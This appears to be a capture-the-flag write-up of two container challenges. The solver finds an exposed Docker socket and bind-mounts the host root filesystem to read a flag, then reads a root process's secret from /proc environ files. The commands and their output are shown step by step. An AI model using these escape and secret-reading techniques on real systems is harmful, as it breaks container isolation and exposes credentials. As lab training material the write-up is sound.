## Intro

The history of containers in software can be traced 
back to the early days of Unix, in the late 1970s. The
first container-like technology was the chroot system 
call, which allows a process to be isolated from the  
rest of the system by restricting its access to a     
specific directory tree.

We connect to the attached server and can immediately see a docker image getting loaded:

```console
┌──(user@kali)-[/media/sf_CTFs/google/2010/0]
└─$ socat -,raw,echo=0 tcp:container1.2023-bq.ctfcompetition.com:1337
== proof-of-work: disabled ==

WARNING: Error loading config file: /root/.docker/config.json: open /root/.docker/config.json: permission denied
01d94a7d7194:/#
```

Let's see if we can run docker commands:

```console
01d94a7d7194:/# docker container ls -a
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
```

There's a problem communicating with the docker daemon, but maybe the socket path is just different
than the default?

```console
01d94a7d7194:/# find / -name docker.sock 2>/dev/null
/tmp/docker.sock
```

We can set an environment variable to change the default path to the docker daemon:

```console
01d94a7d7194:/# export DOCKER_HOST=unix:///tmp/docker.sock
```

Now we can repeat the previous command successfully:

```console
01d94a7d7194:/# docker container ls -a
CONTAINER ID   IMAGE          COMMAND       CREATED          STATUS          PORTS     NAMES
01d94a7d7194   alpine:bqctf   "/bin/bash"   54 seconds ago   Up 54 seconds             magical_engelbart
```

The hint shows us how to map a folder between the host and the guest, let's use a similar syntax
to map the root folder:

```console
01d94a7d7194:/# docker run -it --mount type=bind,src=/sys,target=/sys --mount type=bind,src=/,target=/Root alpine:bqctf
/ # ls /Root
bin     etc     lib     libx32  opt     run     sys     var
boot    flag    lib32   media   proc    sbin    tmp
dev     home    lib64   mnt     root    srv     usr
```

There's the flag.

```console
/ # cat /Root/flag
FLAG{YourSocksAreUntied}
```

Let's connect to the provided server:

```console
┌──(user@kali)-[/media/sf_CTFs/google/2010/1]
└─$ socat -,raw,echo=0 tcp:container2.2023-bq.ctfcompetition.com:1337

Loaded image: alpine:bqctf
WARNING: Error loading config file: /root/.docker/config.json: open /root/.docker/config.json: permission denied
```

Do we have a docker daemon?

```console
58db94dcc552:/# find / -name docker.sock 2>/dev/null
58db94dcc552:/#
```

No, we don't. Now what? Let's check the running processes:

```console
58db94dcc552:/# ps
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/bash /home/user/start.sh
    2 root      0:00 containerd --root /tmp/containerd_root --state /tmp/contai
    4 root      0:00 dockerd -H unix:///tmp/docker.sock --containerd=/tmp/conta
   39 root      1:07 /bin/bash /home/user/flag.sh
   50 root      0:00 docker --log-level fatal -H unix:///tmp/docker.sock run --
   64 root      0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 58db9
   83 root      0:00 /bin/bash
   99 root      0:00 ps
```

Process 39 seems interesting, let's take a look at it via `/proc`:

```console
58db94dcc552:/# cat /proc/39/environ && echo
FLAG=FLAG{DontPutSecretsInEnvironmentVariables}PWD=/home/userSHLVL=0_=/bin/bash
58db94dcc552:/#
```

The flag: `FLAG{DontPutSecretsInEnvironmentVariables}`
